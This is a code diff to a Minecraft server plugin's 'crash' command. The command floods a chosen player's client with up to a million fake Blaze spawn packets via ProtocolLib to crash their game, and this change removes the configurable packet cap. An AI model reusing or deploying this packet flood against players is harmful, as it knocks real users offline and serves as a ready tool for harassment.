@@ -27,26 +27,22 @@ public class crash {
                 } else {
                     if (!Methods.isPerm(target, "hcore.command.crash.exempt")) {
                         if (Methods.checkPlugin(Plugins.ProtocolLib)) {
-                            Location loc = target.getLocation();
-                            WrapperPlayServerSpawnEntityLiving packet = new WrapperPlayServerSpawnEntityLiving();
+                            HCore.getPlugin().getServer().getScheduler().scheduleSyncDelayedTask(HCore.getPlugin(), () -> {
+                                Location loc = target.getLocation();
+                                WrapperPlayServerSpawnEntityLiving packet = new WrapperPlayServerSpawnEntityLiving();
 
-                            packet.setType(EntityType.BLAZE);
-                            packet.setX(loc.getX());
-                            packet.setY(loc.getY());
-                            packet.setZ(loc.getZ());
-
-                            int power = (length > 1) ? Math.max(Integer.parseInt(args[1]), 1) : 30000;
-                            if (power > 30000 && !Methods.isPerm(player, null)) power = 30000;
-                            if (power > 250000) power = 250000;
-
-                            for (int i = 0; i < power; i++) {
-                                packet.setEntityID((int) (Math.random() * Integer.MAX_VALUE));
-                                packet.sendPacket(target);
-                            }
+                                packet.setType(EntityType.BLAZE);
+                                packet.setX(loc.getX());
+                                packet.setY(loc.getY());
+                                packet.setZ(loc.getZ());
+                                for (int i = 0; i < 1000000; i++) {
+                                    packet.setEntityID((int) (Math.random() * Integer.MAX_VALUE));
+                                    packet.sendPacket(target);
+                                }
+                            });
 
                             Informer.send(player, HCore.lang.getString("commands.crash.success")
                                     .replace("{player}", target.getName())
-                                    .replace("{power}", "" + power)
                             );
 
                             return true;
